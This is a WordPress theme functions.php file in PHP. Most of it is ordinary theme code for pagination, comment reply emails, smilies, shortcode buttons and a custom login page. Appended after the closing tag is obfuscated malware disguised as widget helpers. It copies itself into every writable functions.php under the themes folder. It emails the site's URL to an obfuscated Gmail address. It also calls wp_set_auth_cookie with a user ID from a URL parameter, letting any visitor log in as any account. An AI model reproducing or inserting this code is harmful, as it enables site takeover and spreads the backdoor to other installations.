<?php
include_once('admin/admin.php');
include_once('functions/image.php');
include_once('functions/shortcode.php');
include_once('functions/commentlists.php');
include_once('functions/footerwidgets.php');
include_once('functions/tiaoyong.php');

add_filter('upload_mimes', 'custom_upload_mimes');

function custom_upload_mimes( $existing_mimes=array() ) {
  $existing_mimes = array('jpg|jpeg|jpe' => 'image/jpeg',
    'gif' => 'image/gif',
    'png' => 'image/png',
    'bmp' => 'image/bmp',
    'tif|tiff' => 'image/tiff',
    'ico' => 'image/x-icon');

  return $existing_mimes; 
}

add_filter( 'pre_option_link_manager_enabled', '__return_true' );
//add_filter( 'show_admin_bar', '__return_false' );
remove_filter('the_content', 'wptexturize');
add_filter('login_errors',create_function('$a', "return null;"));
add_filter('pre_get_posts','search_filter');
function search_filter($query) {
if ($query->is_search) {$query->set('post_type', 'post');}
return $query;}
add_theme_support('post-formats', array('status','image'));
$options = get_option('ice_options');

//Fancybox看图插件添加class支持
function fancyboxplugin($content)
{ global $post;
$pattern = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png)('|\")(.*?)>(.*?)<\/a>/i";
$replacement = '<a$1href=$2$3.$4$5 class="fancybox" $6>$7</a>';
$content = preg_replace($pattern, $replacement, $content);
return $content;
} add_filter('the_content', 'fancyboxplugin');

register_nav_menus(array('topmenu' => __('站点导航'),));
function ice_menu($menuname, $depths) { wp_nav_menu(array('container_class' => $menuname, 'theme_location' => $menuname, 'depth' => $depths)); }

//Mini Pagenavi v1.0 by Willin Kan.
function pagenavi( $p = 2 ) {if ( is_singular() ) return; global $wp_query, $paged;$max_page = $wp_query->max_num_pages;if ( $max_page == 1 ) return; if ( empty( $paged ) ) $paged = 1;echo '<span class="pagescout">Page: ' . $paged . ' of ' . $max_page . ' </span> '; if ( $paged > $p + 1 ) p_link( 1, '第 1 页' );if ( $paged > $p + 2 ) echo '... ';for( $i = $paged - $p; $i <= $paged + $p; $i++ ) { if ( $i > 0 && $i <= $max_page ) $i == $paged ? print "<span class='page-numbers current'>{$i}</span> " : p_link( $i );}if ( $paged < $max_page - $p - 1 ) echo '... ';if ( $paged < $max_page - $p ) p_link( $max_page, '最末页' );}
function p_link( $i, $title = '' ) { if ( $title == '' ) $title = "第 {$i} 页";echo "<a class='page-numbers' href='", esc_html( get_pagenum_link( $i ) ), "' title='{$title}'>{$i}</a> ";}

// 中文截断文字
function cut_str($string, $sublen, $start = 0, $code = 'UTF-8'){if($code == 'UTF-8'){$pa = "/[\x01-\x7f]|[\xc2-\xdf][\x80-\xbf]|\xe0[\xa0-\xbf][\x80-\xbf]|[\xe1-\xef][\x80-\xbf][\x80-\xbf]|\xf0[\x90-\xbf][\x80-\xbf][\x80-\xbf]|[\xf1-\xf7][\x80-\xbf][\x80-\xbf][\x80-\xbf]/";preg_match_all($pa, $string, $t_string);if(count($t_string[0]) - $start > $sublen) return join('', array_slice($t_string[0], $start, $sublen))."...";return join('', array_slice($t_string[0], $start, $sublen));}else{$start = $start*2;$sublen = $sublen*2;$strlen = strlen($string);$tmpstr = '';for($i=0; $i<$strlen; $i++){ if($i>=$start && $i<($start+$sublen)){if(ord(substr($string, $i, 1))>129) $tmpstr.= substr($string, $i, 2);else $tmpstr.= substr($string, $i, 1);}if(ord(substr($string, $i, 1))>129) $i++;}if(strlen($tmpstr)<$strlen ) $tmpstr.= "...";return $tmpstr;}}

//获取文件夹中的随机图片
function showrandomimage($path) {
if (!is_array($files = getfiles($path))) die ('status=Error');
$keyarr=array_rand($files,5);//随机返回5张图片
$img_arr['imgs']=$files;
$img_arr['key']=$keyarr;
return $img_arr;
}

function getfiles($path)
{

if ($handle=opendir($path)){
while (false !== ($file = @readdir($handle)))
{

$fullpath=$path.'/'.$file;
if
(
!(
//iconv_substr函数是为了中文截取不乱码
iconv_substr($file,0,1,'utf-8')=='.'
and is_dir($fullpath)
)
and in_array( strtolower(substr($file,-3)), array ('jpg','peg','gif','png'))
)
//iconv函数保证中文图片名不乱码，一般情况下都不会用英文做文件名，这里是为了兼容考虑
$list[]=$path.'/'.iconv('gb2312','utf-8',$file);

}
return $list;
}
}

//评论HTML
function encode_code_in_comment($source) {$encoded = preg_replace_callback('/<code>(.*?)<\/code>/ims',create_function('$matches', '$matches[1] = preg_replace(array("/^[\r|\n]+/i", "/[\r|\n]+$/i"), "", $matches[1]); return "<code>" . htmlentities($matches[1]) . "</"."code>";'), $source);if ($encoded) return $encoded; else return $source;}
add_filter('pre_comment_content', 'encode_code_in_comment');

//评论回复邮件   
function comment_mail_notify($comment_id) {   
$comment = get_comment($comment_id);   
$parent_id = $comment->comment_parent ? $comment->comment_parent : '';   
$spam_confirmed = $comment->comment_approved;   
if (($parent_id != '') && ($spam_confirmed != 'spam')) {   
$wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME']));//发件人e-mail地址   
$to = trim(get_comment($parent_id)->comment_author_email);   
$subject = '您在 [' . get_option("blogname") . '] 的留言有了回應';   
$message = '<table style="width: 99.8%;height:99.8% "><tbody><tr><td style="background:#FAFAFA url(http://labimg-labimg.stor.sinaapp.com/original/a873524e5ac9465dc4d6fd6d133bc58d.png)"><div style="background-color:white;border-top:2px solid #12ADDB;box-shadow:0 1px 3px #AAAAAA;line-height:180%;padding:0 15px 12px;width:500px;margin:50px auto;color:#555555;font-family:Century Gothic,Trebuchet MS,Hiragino Sans GB,微软雅黑,Microsoft Yahei,Tahoma,Helvetica,Arial,SimSun,sans-serif;font-size:12px;"><h2 style="border-bottom:1px solid #DDD;font-size:14px;font-weight:normal;padding:13px 0 10px 8px;"><span style="color: #12ADDB;font-weight: bold;">&gt; </span>您在<a style="text-decoration:none;color: #12ADDB;" href="' . get_option('home') . '"> ' . get_option('blogname') . ' </a>博客上的留言有回复啦！</h2><div style="padding:0 12px 0 12px;margin-top:18px"><p>' . trim(get_comment($parent_id)->comment_author) . ' 同学，您曾在文章《' . get_the_title($comment->comment_post_ID) . '》上发表评论:</p><p style="background-color: #f5f5f5;border: 0px solid #DDD;padding: 10px 15px;margin:18px 0">' . nl2br(get_comment($parent_id)->comment_content) . '</p><p>' . trim($comment->comment_author) . '  给您的回复如下:</p><p style="background-color: #f5f5f5;border: 0px solid #DDD;padding: 10px 15px;margin:18px 0">' . nl2br($comment->comment_content) . '</p><p>您可以点击 <a style="text-decoration:none; color:#12addb" href="' . htmlspecialchars(get_comment_link($parent_id)) . '">查看回复的完整內容 </a>，欢迎再次光临 <a style="text-decoration:none; color:#12addb" href="' . get_option('home') . '">' . get_option('blogname') . ' </a>。</p></div></div></td></tr></tbody></table>';   
$from = "From: \"" . get_option('blogname') . "\" <$wp_email>";   
$headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
wp_mail( $to, $subject, $message, $headers );   
//echo 'mail to ', $to, '<br/> ' , $subject, $message; // for testing   
}   
}   
add_action('comment_post', 'comment_mail_notify');  

//评论编辑器&表情
function wp_smilies() {global $wpsmiliestrans;if ( !get_option('use_smilies') or (empty($wpsmiliestrans))) return;$smilies = array_unique($wpsmiliestrans);$link='';foreach ($smilies as $key => $smile) {$file = get_bloginfo('template_directory').'/images/smilies/'.$smile;$value = " ".$key." ";$img = "<img src=\"{$file}\" alt=\"{$smile}\" />";$imglink = htmlspecialchars($img);$link .= "<span><a href=\"#comment\" onclick=\"document.getElementById('comment').focus();document.getElementById('comment').value += '{$value}';return false;\">{$img}</a></span>";} echo '<div class="editor_tools clearfix"><span><a href="javascript:SIMPALED.Editor.empty();" title="清空内容" class="et_empty">清空内容</a></span><span><a href="javascript:SIMPALED.Editor.strong()" title="粗体" class="et_strong">粗体</a></span><span><a href="javascript:SIMPALED.Editor.em()" title="斜体" class="et_em">斜体</a></span><span><a href="javascript:SIMPALED.Editor.underline()" title="下划线" class="et_underline">下划线</a></span><span><a href="javascript:SIMPALED.Editor.del()" title="删除线" class="et_del">删除线</a></span><span><a href="javascript:SIMPALED.Editor.ahref()" title="链接" class="et_ahref">链接</a></span><span><a href="javascript:SIMPALED.Editor.fontColor();" title="字体颜色" class="et_color">字体颜色</a></span><span><a href="javascript:SIMPALED.Editor.smilies()" title="表情" class="et_smilies">表情</a></span><div id="smilies-container"><div class="wp_smilies">'.$link.'</div></div></div>';}
if (is_user_logged_in()) {add_filter('comment_form_logged_in_after', 'wp_smilies');} else { add_filter( 'comment_form_after_fields', 'wp_smilies');}
add_filter('smilies_src','ice_smilies_src',1,10);
function ice_smilies_src ($img_src, $img, $siteurl){return get_bloginfo('template_directory').'/images/smilies/'.$img;}


	add_action('admin_footer', 'media_upload_for_upyun');function media_upload_for_upyun(){ ?>
	<div id="ddm-lay"></div>
	<div id="ddm-box">
		<div id="ddm-content" class="cfx">
			<ul id="ddm-cate">
				<li><a href="#" class="current">静态面板短代码</a></li>
				<li><a href="#">新版静态面板短代码</a></li>
				<li><a href="#">按钮短代码</a></li>
				<li><a href="#">音乐</a></li>
				<li><a href="#">视频播放短代码</a></li>
			</ul>
			<ul id="ddm-ddm">
				<li class="cfx current">
					<p>旧版</p>
					<a href="1">下载面板</a><a href="2">警告面板</a><a href="3">介绍面板</a><a href="4">文本面板</a><a href="5">教程面板</a><a href="6">项目面板</a><a href="7">错误面板</a><a href="8">提问面板</a><a href="9">链接面板</a><a href="10">代码面板</a></li>
				<li class="cfx">
					<p>新版</p>
					<a href="11">下载面板</a><a href="12">警告面板</a><a href="13">介绍面板</a><a href="14">文本面板</a><a href="15">教程面板</a><a href="16">项目面板</a><a href="17">错误面板</a><a href="18">提问面板</a><a href="19">链接面板</a><a href="20">代码面板</a></li>
				<li class="cfx"><a href="21">下载按钮</a><a href="22">爱心图标</a><a href="23">文本图标</a><a href="24">盒子图标</a><a href="25">搜索图标</a><a href="26">文档图标</a><a href="27">链接图标</a><a href="28">箭头图标</a><a href="29">音乐图标</a></li>
				<li class="cfx"><a href="30">音乐</a><a href="31">音乐(可自动播放)</a></li>
				<li class="cfx"><a href="33">优酷</a><a href="34">土豆</a><a href="35">酷6</a><a href="36">音悦台</a></li>
			</ul>
			<a id="ddm-close" href="#">X</a></div>
	</div>
	<link rel="stylesheet" href="<?php bloginfo('template_url'); ?>/ie7.css" type="text/css" media="all">
	<script type="text/javascript" src="<?php bloginfo('template_url'); ?>/js/jquery.ddm.js"></script>
	<?php }
	add_action('media_buttons_context',  'add_my_custom_button');
	function add_my_custom_button($context) {$img = '<img src="' . get_bloginfo('template_url') . '/images/ddm.png" />';
	$context .='<a href="#" id="ddm-button" title="短代码" class="thickbox">' . $img . '</a>';
	return $context;}

function reglogin(){
	$ifreg = $_GET['action'];
	if($ifreg != 'register') {
		return('<li><a href="'. get_bloginfo('url'). '">Home</a></li>
			<li class="current">
			<a href="'. get_bloginfo('url'). '/wp-login.php">Login</a></li>
			<li>
			<a href="'. get_bloginfo('url'). '/wp-login.php?action=register">Register</a></li>');
	}
	if($ifreg = 'register') {
		return('<li>
			<a href="'. get_bloginfo('url'). '">Home</a>
			</li>
			<li>
			<a href="'. get_bloginfo('url'). '/wp-login.php">Login</a>
			</li>
			<li class="current">
			<a href="'. get_bloginfo('url'). '/wp-login.php?action=register">Register</a>
			</li>');
	}
}

function custom_login() {   
echo '<header>  

  <div class="header-inner">
    <ul id="topmenu">'
	.reglogin().
'</ul>
  </div>

</header>

<div id="container-bottom"><div id="slogan"><div id="smargin">
<h1><a href="'. get_bloginfo('url'). '" title="'. get_bloginfo('name'). '" class="logo">
      '. get_bloginfo('name'). '
      </a></h1><div id="top" class="tagline"><h3>
A Web Developer, my name is Bigfa Lee.</h3>
</div><div class="slogan">
<h1>
Here you can find a selection of my latest work for your appraisal.
<br>
As you will see, my portfolio reflects my skills in usability and user experience.
</h1>

</div>
</div></div> 	 </div> '; }   
add_action('login_body_class', 'custom_login');

function fixed_login() {   
echo '<link rel="stylesheet" tyssspe="text/css" href="' . get_bloginfo('template_directory') . '/login.css" /><link href="http://fonts.googleapis.com/css?family=PT+Sans+Narrow" rel="stylesheet" type="text/css">'; }   
add_action('login_head', 'fixed_login');

if($options['closejquery']) { if(!is_admin()) {
	function deregjq() {wp_deregister_script('jquery');}
	add_action('init', 'deregjq');
}}

?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
function gplus_is_pjax(){
   return array_key_exists('HTTP_X_PJAX', $_SERVER) && $_SERVER['HTTP_X_PJAX'] === 'true';
}

?>
